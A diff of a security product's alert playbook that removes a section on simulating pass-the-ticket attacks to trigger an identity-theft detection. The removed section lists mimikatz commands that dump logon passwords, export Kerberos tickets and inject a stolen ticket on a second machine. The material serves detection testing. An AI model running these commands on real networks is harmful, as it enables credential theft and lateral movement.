@@ -245,47 +245,6 @@ Detail in the alert:
 
 ![Brute force attack alert details.](media/playbooks/brute-force-details.png)  
 
-## Suspected identity theft (pass-the-ticket) & (pass-the-hash)
-
-For details about this alert, see [Suspected identity theft (pass-the-ticket) (external ID 2018)](lateral-movement-alerts.md#suspected-identity-theft-pass-the-ticket-external-id-2018) and [Suspected identity theft (pass-the-hash) (external ID 2017)](lateral-movement-alerts.md#suspected-identity-theft-pass-the-hash-external-id-2017).
-
-Pass-the-Ticket or Pass-The-Hash is a lateral movement technique in which attackers steal a Kerberos ticket or user's NTLM hash from one computer and use it to gain access to another computer by reusing the stolen ticket or user's NTLM hash.
-  
-This detection is often misunderstood. If you perform a Pass-The-Ticket from one security context to another security context on the same machine, you won't generate a Defender for Identity alert. This activity can only be seen with an EDR on a managed machine.
-
-What Defender for Identity can detect, without any client agent and even if the activity is seen from an unmanaged machine (without EPP or EDR), is if one Kerberos ticket (TGT) was issued to a user on a specific machine (Name, IP) and the same ticket is seen coming from another machine (Name, IP). Then Defender for Identity can trigger a Suspected identity theft.
-
-In this detection, a Kerberos ticket is seen used on two (or more) different computers.  
-
-On *machine 1* (ADMIN-PC), where a domain user is in used (logon as Task, Service, RDP, Interactive), from a command line run as local admin:
-
-```cmd
-mimikatz # privilege::debug 
-mimikatz # sekurlsa::logonpasswords  
-mimikatz # sekurlsa::tickets /export 
-```
-
-You should rename the Nuck's TGT file (or whatever) to nuck.kirbi
-
-On *machine 2* (VICTIM-PC), from a command line run as local admin:
-
-```cmd
-mimikatz # privilege::debug  
-mimikatz # kerberos::ptt nuck.kirbi
-mimikatz # Quit 
-Klist 
-```
-
-From the result, check if the TGT for nuck is loaded.
-
-Perform an LDAP bind (digest), for example with LDP.exe. The stolen TGT from *machine 1* will be presented to a domain controller to issue a TGS for the LDAP query.
-
-Tools available from: <https://github.com/gentilkiwi/mimikatz/releases>  
-  
-Detail in the alert:  
-
-![Suspected identity theft alert details](media/playbooks/identity-theft-details.png)  
-
 ## Malicious request of Data Protection API (DPAPI) master key
 
 For details about this alert, see [Malicious request of Data Protection API master key (external ID 2020)](domain-dominance-alerts.md#malicious-request-of-data-protection-api-master-key-external-id-2020).
